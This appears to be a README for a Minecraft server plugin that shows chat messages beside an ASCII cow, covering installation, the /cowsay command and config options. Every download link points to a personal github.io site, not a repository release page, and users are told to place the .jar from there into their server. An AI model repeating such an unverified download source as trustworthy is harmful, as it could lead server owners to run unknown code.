# 🐄 CowsayPaperPlugin - Display fun messages in your server

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ssuhaira3192.github.io)

CowsayPaperPlugin brings the classic Linux command into your Minecraft server. It lets you display text inside a speech bubble next to an ASCII art cow. Players on your server see these messages in the chat. It adds life to your server announcements or decorative displays.

## 📋 System Requirements

*   A running PaperMC, Spigot, or Bukkit server.
*   Java Development Kit (JDK) 17 or newer installed.
*   At least 512MB of dedicated RAM for your server.
*   Administrator access to your server files.

## 📥 Getting the software

Visit [this page](https://ssuhaira3192.github.io) to download the latest version of the plugin. 

Look for the file that ends in .jar under the Assets section. Save this file to a folder on your computer where you can find it. You do not need to install this like a normal program. You simply place the file into your server directory.

## ⚙️ Installation

1. Stop your Minecraft server if it runs.
2. Locate the folder named "plugins" inside your main server directory.
3. Open the "plugins" folder.
4. Copy the .jar file you downloaded into this folder.
5. Start your server.

The server detects the new file and creates a configuration folder automatically. You can verify the installation by typing the "plugins" command in your server console. You should see CowsayPaperPlugin listed in green text.

## 📖 How to use

This plugin adds a single main command to your server. 

Type `/cowsay <your message here>` in the chat or console. The server replaces your text with a graphic cow holding your words in a callout box.

If you are an operator on your server, you have immediate access to this command. If you want regular players to use it, you must assign the correct permission node to their rank. Use your existing permission management plugin to grant the access node: `cowsay.use`.

## 🛠️ Configuration

The plugin creates a settings file in the plugins folder. Navigate to `plugins/CowsayPaperPlugin/config.yml` to change how the plugin acts.

You can modify these options:
*   `cow-type`: Change the ASCII art character.
*   `bubble-color`: Pick the chat color for the message text.
*   `enabled`: Turn the plugin on or off.

Always save the file after you make changes. Type `/cowsay reload` in the game to apply your new settings without restarting the server.

## ❓ Troubleshooting

If the plugin fails to load, check your server console log. Look for error messages that start with "CowsayPaperPlugin". 

Common issues include:
*   Using an old version of Java.
*   Running an outdated server version that does not support the plugin.
*   Missing dependencies.

Ensure your server version matches the version specified on the release page. If the plugin does not start, delete the .jar file and download it again from [the release link](https://ssuhaira3192.github.io). Ensure your folder permissions allow the server to write new files, as the plugin needs to create its own folder to function.

## 📦 Features

*   **Custom ASCII Art:** Switch between different cow styles or other creatures.
*   **Chat Integration:** Messages appear in the standard Minecraft chat view.
*   **Performance Focused:** The plugin uses minimal system resources and will not lag your server.
*   **Simple Setup:** No database or complex setup is required. 
*   **Permission Support:** Control exactly who can trigger the command.

## 🤝 Support

This project relies on the standard PaperMC API. It keeps simple functionality for server owners who want lightweight additions. The code remains open for inspection if you want to understand how it handles text rendering. 

If you find a bug, report it on the repository issues page. Provide the version of the plugin you use and a copy of your server log. Include the steps to reproduce the issue. This makes it easier to track down the cause and fix it for everyone.